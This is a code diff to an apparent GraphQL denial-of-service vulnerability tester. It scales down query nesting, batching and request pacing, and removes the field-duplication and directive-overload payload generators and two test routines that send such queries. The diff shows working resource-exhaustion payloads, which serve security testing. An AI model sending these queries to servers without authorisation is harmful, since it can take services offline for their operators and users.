@@ -135,7 +135,7 @@ class root():
         """
 
         # Build up nested levels
-        for _ in range(10):
+        for _ in range(5):
             nested_query = f"""
             {base_ref['field']} {{
                 id
@@ -163,49 +163,6 @@ class root():
 
         return full_query
 
-    def generateFieldDuplication(self) -> str:
-        """
-        Generate a query with duplicated fields based on schema.
-        """
-        if not self.query_type or not self.types.get(self.query_type):
-            return ""
-
-        # Get all scalar fields from the query type
-        scalar_fields = []
-        for field in self.types[self.query_type]['fields']:
-            field_type = field['type'].get('name')
-            if field_type in ['String', 'Int', 'Float', 'Boolean', 'ID']:
-                scalar_fields.append(field['name'])
-
-        if not scalar_fields:
-            return ""
-
-        # Duplicate the first scalar field many times
-        duplicated_field = f"{scalar_fields[0]}\n" * 10000
-        return f"query {{ {duplicated_field} }}"
-
-    def generateDirectiveOverload(self) -> str:
-        """
-        Generate a query with excessive directives based on schema.
-        """
-        if not self.query_type or not self.types.get(self.query_type):
-            return ""
-
-        # Get the first field from the query type
-        first_field = next(iter(self.types[self.query_type]['fields']), None)
-        if not first_field:
-            return ""
-
-        # Add many include directives
-        directives = "@include(if: true) " * 1000
-        return f"""
-        query {{
-            {first_field['name']} {directives} {{
-                id
-            }}
-        }}
-        """
-
     def generateObjectOverride(self) -> str:
         """
         Generate a deeply nested query based on schema types.
@@ -224,7 +181,7 @@ class root():
             return ""
 
         # Create deeply nested query
-        nested_levels = 100
+        nested_levels = 50
         current_query = "id"
         for _ in range(nested_levels):
             current_query = f"""
@@ -256,7 +213,7 @@ class root():
                 }}
             }}
             """
-        } for _ in range(1000)]
+        } for _ in range(100)]
 
     async def setEndpoint(self, endpoint: str, proxy_string: Optional[str] = None) -> bool:
         """
@@ -332,54 +289,6 @@ class root():
         except Exception:
             return False, 0.0
 
-    async def testDirectiveOverload(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
-        """Test for directive overloading vulnerability using schema-based query."""
-        query = self.generateDirectiveOverload()
-        if not query:
-            return False, 0.0
-
-        start_time = time.time()
-        try:
-            async with session.post(
-                self.endpoint,
-                json={'query': query},
-                headers={'Content-Type': 'application/json'},
-                timeout=aiohttp.ClientTimeout(total=10),
-                proxy=self.proxy_url,
-                ssl=False
-            ) as response:
-                duration = time.time() - start_time
-                is_vulnerable = duration > 5 or response.status == 500
-                return is_vulnerable, duration
-        except asyncio.TimeoutError:
-            return True, 10.0
-        except Exception:
-            return False, 0.0
-
-    async def testObjectOverride(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
-        """Test for object override vulnerability using schema-based query."""
-        query = self.generateObjectOverride()
-        if not query:
-            return False, 0.0
-
-        start_time = time.time()
-        try:
-            async with session.post(
-                self.endpoint,
-                json={'query': query},
-                headers={'Content-Type': 'application/json'},
-                timeout=aiohttp.ClientTimeout(total=10),
-                proxy=self.proxy_url,
-                ssl=False
-            ) as response:
-                duration = time.time() - start_time
-                is_vulnerable = duration > 5 or response.status == 500
-                return is_vulnerable, duration
-        except asyncio.TimeoutError:
-            return True, 10.0
-        except Exception:
-            return False, 0.0
-
     async def testArrayBatching(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
         """Test for array batching vulnerability using schema-based query."""
         queries = self.generateArrayBatching()
@@ -419,8 +328,6 @@ class root():
             tests = [
                 ("Circular Query DoS", self.testCircularQuery),
                 ("Field Duplication DoS", self.testFieldDuplication),
-                ("Directive Overload DoS", self.testDirectiveOverload),
-                ("Object Override DoS", self.testObjectOverride),
                 ("Array Batching DoS", self.testArrayBatching)
             ]
             
@@ -428,7 +335,7 @@ class root():
                 self.message.printMsg(f"Testing for {vuln_type}...", status="log")
                 is_vulnerable, duration = await test_func(session)
                 self.printVulnerabilityDetails(vuln_type, is_vulnerable, duration)
-                await asyncio.sleep(1)
+                await asyncio.sleep(10)
 
 # async def main():
 #     dos_tester = grapeDos()
